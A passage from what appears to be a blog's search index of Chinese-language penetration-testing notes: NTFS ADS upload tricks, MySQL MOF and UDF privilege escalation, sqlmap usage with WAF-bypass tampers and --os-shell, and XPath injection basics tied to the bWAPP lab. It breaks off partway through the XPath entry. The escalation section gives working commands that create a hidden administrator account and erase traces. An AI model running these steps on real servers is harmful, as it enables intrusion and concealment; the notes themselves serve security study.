<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NTFS-ADS</title>
    <url>/2020/09/27/NTFS-ADS/</url>
    <content><![CDATA[<h1 id="NTFS交换数据流"><a href="#NTFS交换数据流" class="headerlink" title="NTFS交换数据流"></a>NTFS交换数据流</h1><h2 id="NTFS-ADS是什么"><a href="#NTFS-ADS是什么" class="headerlink" title="NTFS ADS是什么"></a>NTFS ADS是什么</h2><p>NTFS交换数据流（<code>alternate data streams</code>简称ADS）是NTFS磁盘格式的一个特性。</p>
<h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><p>一个完整的流的格式为：<code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</code></p>
<p>流类型总是以<code>$</code>符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流($DATA)，默认流名为空</p>
<p>ADS可以省略流名，但不能省略流类型 （demo.txt : : $DATA）</p>
<p>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流(<code>$INDEX_ALLOCATION</code>)，流名默认为<code>$I30</code></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><table>
<thead>
<tr>
<th>上传的文件名</th>
<th>服务器表面现象</th>
<th align="left">生成的文件内容</th>
</tr>
</thead>
<tbody><tr>
<td>Test.php:a.jpg</td>
<td>生成Test.php</td>
<td align="left">空</td>
</tr>
<tr>
<td>Test.php::$DATA</td>
<td>生成test.php</td>
<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
</tr>
<tr>
<td>Test.php::$INDEX_ALLOCATION</td>
<td>生成test.php文件夹</td>
<td align="left"></td>
</tr>
<tr>
<td>Test.php::$DATA\0.jpg</td>
<td>生成0.jpg</td>
<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
</tr>
<tr>
<td>Test.php::$DATA\aaa.jpg</td>
<td>生成aaa.jpg</td>
<td align="left"><code>&lt;?php phpinfo();?&gt;</code></td>
</tr>
</tbody></table>
<p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
]]></content>
  </entry>
  <entry>
    <title>SQLPrivilgeEscalation</title>
    <url>/2020/09/27/SQLPrivilgeEscalation/</url>
    <content><![CDATA[<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h2 id="1-MOF-提取"><a href="#1-MOF-提取" class="headerlink" title="1.MOF 提取"></a>1.MOF 提取</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。</span><br></pre></td></tr></table></figure>

<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>利用了<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="编写mof文件，必须命名为nullevt-mof"><a href="#编写mof文件，必须命名为nullevt-mof" class="headerlink" title="编写mof文件，必须命名为nullevt.mof"></a>编写mof文件，必须命名为nullevt.mof</h4><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name  = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"</span>Win32_LocalTime\<span class="string">" "</span></span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =</span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="string">")\nWSH.run(\"</span>net.exe user admin admin.admin /add\<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    <span class="built_in">Filter</span> = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="上传到c-windows-system32-或c-winnt-目录"><a href="#上传到c-windows-system32-或c-winnt-目录" class="headerlink" title="上传到c:\windows\system32(或c:\winnt\)目录"></a>上传到c:\windows\system32(或c:\winnt\)目录</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'</span><br><span class="line"></span><br><span class="line"><span class="comment">--此处C:/wmpub/nullevt.mof为上次mof文件位置，可联合文件上传漏洞，在www目录下写入mof文件</span></span><br></pre></td></tr></table></figure>

<p>此处<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin.admin /add\&quot;)</code>执行添加admin用户</p>
<p>再次上传mof文件，把admin用户提权到管理员组（修改<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators secist /add\&quot;)</code>）</p>
<p>最终创建了管理员用户</p>
<h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>

<h2 id="2-UDF提取"><a href="#2-UDF提取" class="headerlink" title="2.UDF提取"></a>2.UDF提取</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1、其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码。</span><br><span class="line">2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</span><br><span class="line">4、掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</span><br></pre></td></tr></table></figure>

<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</span><br><span class="line"></span><br><span class="line">sqlmap里是有udf.dll文件的，就在sqlmap/udf/mysql/windows目录下，里面有32位和64位</span><br><span class="line">注意：这里的位数是mysql的位数，并不是对方系统的位数。sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中</span><br></pre></td></tr></table></figure>

<h3 id="基本步骤-1"><a href="#基本步骤-1" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="udf-dll解码"><a href="#udf-dll解码" class="headerlink" title="udf.dll解码"></a>udf.dll解码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/sqlmap/extra/cloak/cloak.py  -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/extra/cloak/cloak.py自带的locak解码脚本</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 为sqlmap自带UDF文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">执行完成后会在/usr/share/sqlmap/data/udf/mysql/windows/64/文件夹下生成lib_mysqludf_sys.dll文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_eval，执行任意命令，并将输出返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_exec，执行任意命令，并将退出码返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_get，获取一个环境变量。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_set，创建或修改一个环境变量。</span></span><br></pre></td></tr></table></figure>

<p>并把lib_mysqludf_sys.dll文件上传到站点目录下，改名为udf.dll</p>
<h4 id="文件导入"><a href="#文件导入" class="headerlink" title="文件导入"></a>文件导入</h4><p>MySQL&lt;5.0，导出路径随意；</p>
<p>5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）</p>
<p>MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
<p>一般lib\plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）有webshell可以直接创建，没有的话使用 into dumpfile 写入</p>
<h5 id="手工建立lib-plugin文件夹"><a href="#手工建立lib-plugin文件夹" class="headerlink" title="手工建立lib\plugin文件夹"></a>手工建立lib\plugin文件夹</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@basedir;  //查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
<h4 id="从udf文件中引入自定义函数"><a href="#从udf文件中引入自定义函数" class="headerlink" title="从udf文件中引入自定义函数"></a>从udf文件中引入自定义函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll'; </span><br><span class="line"><span class="comment">--sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br></pre></td></tr></table></figure>

<h4 id="执行自定义函数"><a href="#执行自定义函数" class="headerlink" title="执行自定义函数"></a>执行自定义函数</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select sys_eval('net user admin admin /add'); </span><br><span class="line">mysql&gt; select sys_eval('net localgroup administrators admin /add');</span><br></pre></td></tr></table></figure>

<h4 id="远程桌面连接-1"><a href="#远程桌面连接-1" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>

<h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop function sys_eval; --删除函数</span><br><span class="line">mysql&gt; delete from mysql.func where name='sys_eval' --删除函数</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>版本&gt;5.6.34 secure-file-priv需要为空才可以通过mysql传udf</strong></p>
<h4 id="1-into-outfile-直接写入"><a href="#1-into-outfile-直接写入" class="headerlink" title="1. into outfile 直接写入"></a>1. into outfile 直接写入</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.写入文件</span></span><br><span class="line">mysql&gt; select A into outfile 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">-- 3.创建sys_eval</span></span><br><span class="line">mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';</span><br><span class="line"><span class="comment">-- 4.获取system执行权限</span></span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>

<h4 id="2-表内容导出写入"><a href="#2-表内容导出写入" class="headerlink" title="2. 表内容导出写入"></a>2. 表内容导出写入</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.建立表保存16进制内容</span></span><br><span class="line">mysql&gt; set @my_udf=concat('',A);</span><br><span class="line">mysql&gt; create table udf_data(data LONGBLOB);</span><br><span class="line"><span class="comment">--3.将my_udf的内容插入表udf_data中。</span></span><br><span class="line">mysql&gt; insert into udf_data values("");</span><br><span class="line">mysql&gt; update udf_data set data = @my_udf;</span><br><span class="line"><span class="comment">--4.将内容导出到文件。</span></span><br><span class="line">mysql&gt; select data from udf_data into DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">--5.执行系统命令</span></span><br><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll';</span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>

<h2 id="3-sqlmap写入UDF"><a href="#3-sqlmap写入UDF" class="headerlink" title="3.sqlmap写入UDF"></a>3.sqlmap写入UDF</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -d "mysql://root:root@172.0.0.1:3306/mysql" <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/x728999452/article/details/52413974" target="_blank" rel="noopener">MySQL 利用UDF执行命令</a></p>
<p><a href="https://www.cnblogs.com/h4ck0ne/p/5154604.html" target="_blank" rel="noopener">mof/udf提权</a></p>
<p><a href="https://blog.csdn.net/weixin_45427650/article/details/104849928" target="_blank" rel="noopener">udf提取</a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-sqlmap</title>
    <url>/2020/09/26/bWAPP-sqlmap/</url>
    <content><![CDATA[<h1 id="Sqlmap常规使用"><a href="#Sqlmap常规使用" class="headerlink" title="Sqlmap常规使用"></a>Sqlmap常规使用</h1><h2 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h2><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><table>
<thead>
<tr>
<th>参数</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td>-h,–help</td>
<td align="left">显示基本帮助信息并退出</td>
</tr>
<tr>
<td>–version</td>
<td align="left">显示程序版本信息并退出</td>
</tr>
<tr>
<td>-u ，–url</td>
<td align="left">目标URL（get请求注入，直接使用该参数）</td>
</tr>
<tr>
<td>-r REQUESTFILE</td>
<td align="left">一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</td>
</tr>
<tr>
<td>–cookie=COOKIE</td>
<td align="left">HTTP Cookieheader 值</td>
</tr>
<tr>
<td>–user-agent=AGENT</td>
<td align="left">设置HTTP请求头，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</td>
</tr>
<tr>
<td>–referer=REFERER</td>
<td align="left">在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</td>
</tr>
<tr>
<td>–headers=HEADERS</td>
<td align="left">可以通过–headers参数来增加额外的http头</td>
</tr>
<tr>
<td>–delay=DELAY</td>
<td align="left">可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>-f, –fingerprint</td>
<td>执行广泛的DBMS版本指纹检查</td>
</tr>
<tr>
<td>–mobile</td>
<td>设定一个手机的User-Agent来模仿手机登陆</td>
</tr>
<tr>
<td>–level=LEVEL</td>
<td>执行测试的等级（1-5，默认为1）</td>
</tr>
<tr>
<td>–string=STRING</td>
<td>查询时有效时在页面匹配字符串</td>
</tr>
</tbody></table>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>打开所有的优化开关</td>
</tr>
<tr>
<td>–predict-output</td>
<td>预测普通查询输出</td>
</tr>
<tr>
<td>–keep-alive</td>
<td>使用持久HTTP（S）连接</td>
</tr>
<tr>
<td>–null-connection</td>
<td>获取页面长度</td>
</tr>
<tr>
<td>–threads=THREADS</td>
<td>当前http(s)最大请求数 (默认 1)</td>
</tr>
<tr>
<td>–timeout=TIMEOUT</td>
<td>可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</td>
</tr>
<tr>
<td>–retries=RETRIES</td>
<td>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</td>
</tr>
<tr>
<td>–regexp=REGEXP</td>
<td>查询时有效时在页面匹配正则表达式</td>
</tr>
</tbody></table>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><table>
<thead>
<tr>
<th align="left">参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-a, –all</td>
<td>获取所有信息</td>
</tr>
<tr>
<td align="left">-b, –banner</td>
<td>获取数据库管理系统的标识</td>
</tr>
<tr>
<td align="left">–current-user</td>
<td>获取数据库管理系统当前用户</td>
</tr>
<tr>
<td align="left">–privileges</td>
<td>枚举数据库管理系统用户的权限</td>
</tr>
<tr>
<td align="left">–hostname</td>
<td>获取数据库服务器的主机名称</td>
</tr>
<tr>
<td align="left">–is-dba</td>
<td>检测DBMS当前用户是否DBA</td>
</tr>
<tr>
<td align="left">–passwords</td>
<td>枚举数据库管理系统用户密码哈希</td>
</tr>
<tr>
<td align="left">–dump</td>
<td>转储数据库表项</td>
</tr>
<tr>
<td align="left">–count</td>
<td>检索表的项目数</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>–dbs</td>
<td>枚举数据库管理系统数据库</td>
</tr>
<tr>
<td>-D DBName</td>
<td>要进行枚举的指定数据库名</td>
</tr>
<tr>
<td>–tables</td>
<td>枚举的DBMS数据库中的表</td>
</tr>
<tr>
<td>-T TableName</td>
<td>DBMS数据库表枚举</td>
</tr>
<tr>
<td>–columns</td>
<td>枚举DBMS数据库表列</td>
</tr>
<tr>
<td>-C ColumnName,ColumnName</td>
<td>DBMS数据库表列枚举</td>
</tr>
</tbody></table>
<h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h3><table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>–os-cmd=OSCMD</td>
<td>执行操作系统命令（OSCMD）</td>
</tr>
<tr>
<td>–os-shell</td>
<td>交互式的操作系统的shell</td>
</tr>
<tr>
<td>–os-pwn</td>
<td>获取一个OOB shell，meterpreter或VNC</td>
</tr>
<tr>
<td>–os-smbrelay</td>
<td>一键获取一个OOBshell，meterpreter或VNC</td>
</tr>
<tr>
<td>–priv-esc</td>
<td>数据库进程用户权限提升</td>
</tr>
</tbody></table>
<h3 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h3><table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>–reg-read</td>
<td>读一个Windows注册表项值</td>
</tr>
<tr>
<td>–reg-add</td>
<td>写一个Windows注册表项值数据</td>
</tr>
<tr>
<td>–reg-del</td>
<td>删除Windows注册表键值</td>
</tr>
</tbody></table>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--tamper 脚本名称 脚本名称</span><br><span class="line"><span class="comment">#多个tamper脚本之间用空格隔开</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>randomcomments.py</td>
<td>用/**/分割sql关键字</td>
</tr>
<tr>
<td>base64encode.py</td>
<td>用base64编码替换</td>
</tr>
<tr>
<td>apostrophenulencode.py</td>
<td>绕过过滤双引号，替换字符和双引号</td>
</tr>
<tr>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
</tr>
<tr>
<td>randomcase.py</td>
<td>随机大小写</td>
</tr>
<tr>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
</tr>
<tr>
<td>charencode.py</td>
<td>url编码</td>
</tr>
<tr>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
</tr>
<tr>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
</tr>
</tbody></table>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/83658305?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.wap_blog_relevant_no_pic&depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.wap_blog_relevant_no_pic" target="_blank" rel="noopener">sqlmap的常用tamper脚本</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/54774043?utm_medium=distribute.pc_relevant.none-task-blog-title-3&spm=1001.2101.3001.4242" target="_blank" rel="noopener">sqlmap –tamper 绕过WAF脚本分类整理</a></p>
<h2 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h2><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL --cookie=<span class="string">"COOKIE"</span> --banner --dbs --batch </span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap -u URL --cookie="COOKIE" -D DatabaseName -T TableName -C ColumnName,ColumnName...  --dump --batch -o</span></span><br></pre></td></tr></table></figure>

<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL --data=<span class="string">"DATA"</span> --cookie=<span class="string">"COOKIE"</span> --banner --dbs --batch  -o</span><br><span class="line"></span><br><span class="line">sqlmap -r post.txt </span><br><span class="line"><span class="comment">#post.txt文件为提交抓包获取的数据包</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">Sqlmap攻略及技巧分享 </a></p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-XPathInjection</title>
    <url>/2020/09/23/bWAPP-XPathInjection/</url>
    <content><![CDATA[<h1 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>XPath是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准</p>
<p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。</p>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h2 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h2><table>
<thead>
<tr>
<th>节点类型</th>
<th>名称</th>
</tr>
</thead>
<tbody><tr>
<td>element</td>
<td>元素</td>
</tr>
<tr>
<td>attribute</td>
<td>属性</td>
</tr>
<tr>
<td>text</td>
<td>文本</td>
</tr>
<tr>
<td>namespace</td>
<td>命名空间</td>
</tr>
<tr>
<td>processing-instruction</td>
<td>处理指令</td>
</tr>
<tr>
<td>comment</td>
<td>注释</td>
</tr>
<tr>
<td>root</td>
<td>根节点</td>
</tr>
</tbody></table>
<h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><h4 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h4><table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>nodename</td>
<td>选取此节点的所有子节点</td>
</tr>
<tr>
<td>/</td>
<td>从根节点选取</td>
</tr>
<tr>
<td>//</td>
<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点</td>
</tr>
<tr>
<td>..</td>
<td>选取当前节点的父节点</td>
</tr>
<tr>
<td>@</td>
<td>选取属性或　@*：匹配任何属性节点</td>
</tr>
<tr>
<td>*</td>
<td>匹配任何元素节点</td>
</tr>
</tbody></table>
<h3 id="常规语法"><a href="#常规语法" class="headerlink" title="常规语法"></a>常规语法</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"eng"</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"eng"</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>bookstore</td>
<td>选取 bookstore 元素的所有子节点</td>
</tr>
<tr>
<td>/bookstore</td>
<td>选取根元素 bookstore</td>
</tr>
<tr>
<td>bookstore/book</td>
<td>选取属于 bookstore 的子元素的所有 book 元素</td>
</tr>
<tr>
<td>//book</td>
<td>选取所有 book 子元素,而不管它们在文档中的位置</td>
</tr>
<tr>
<td>bookstore//book</td>
<td>选择属于 bookstore 元素的后代的所有 book 元素,而不管它们位于 bookstore 之下的什么位置</td>
</tr>
<tr>
<td>//@lang</td>
<td>选取名为 lang 的所有属性</td>
</tr>
</tbody></table>
<h4 id="限定语"><a href="#限定语" class="headerlink" title="限定语"></a>限定语</h4><p>限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中.</p>
<p>路径表达式结果：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/book[1]</td>
<td>选取属于 bookstore 子元素的第一个 book 元素</td>
</tr>
<tr>
<td>/bookstore/book[last()]</td>
<td>选取属于 bookstore 子元素的最后一个 book 元素</td>
</tr>
<tr>
<td>//title[@lang]</td>
<td>选取所有拥有名为 lang 的属性的 title 元素</td>
</tr>
<tr>
<td>//title[@lang=’eng’]</td>
<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]/title</td>
<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00</td>
</tr>
</tbody></table>
<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任何元素节点</td>
</tr>
<tr>
<td>@*</td>
<td>匹配任何属性节点</td>
</tr>
<tr>
<td>node()</td>
<td>匹配任何类型的节点</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/*</td>
<td>选取 bookstore 元素的所有子元素</td>
</tr>
<tr>
<td>//*</td>
<td>选取文档中的所有元素</td>
</tr>
<tr>
<td>//title[@*]</td>
